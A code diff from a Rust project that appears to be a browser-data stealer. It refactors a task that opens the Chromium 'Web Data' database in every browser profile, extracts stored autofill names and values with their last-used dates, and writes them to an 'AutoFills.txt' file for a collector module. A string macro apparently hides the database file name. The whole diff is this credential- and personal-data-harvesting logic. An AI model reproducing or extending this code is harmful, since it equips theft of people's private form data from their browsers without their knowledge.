@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, AutoFill};
+use crate::{read_and_collect_unique_records, to_string_and_write_all, AutoFill, SqliteDatabase};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
@@ -28,7 +28,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for AutoFillTask {
     parent_name!("AutoFills.txt");
 
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
-        let Some(mut autofills) = collect_and_read_sqlite_from_all_profiles(
+        let Some(mut autofills) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
             &StorageFileSystem,
             |profile| profile / s!("Web Data"),
@@ -49,10 +49,10 @@ impl<C: Collector, F: FileSystem> Task<C, F> for AutoFillTask {
     }
 }
 
-fn extract_autofill_from_record(record: &dyn TableRecord) -> Option<AutoFill> {
+fn extract_autofill_from_record<R: TableRecord>(record: &R) -> Option<AutoFill> {
     let last_used = record.get_value(AUTOFILL_DATE_LAST_USED)?.as_integer()?;
-    let name = record.get_value(AUTOFILL_NAME)?.as_string()?.clone();
-    let value = record.get_value(AUTOFILL_VALUE)?.as_string()?.clone();
+    let name = record.get_value(AUTOFILL_NAME)?.as_string()?;
+    let value = record.get_value(AUTOFILL_VALUE)?.as_string()?;
 
     Some(AutoFill {
         name,
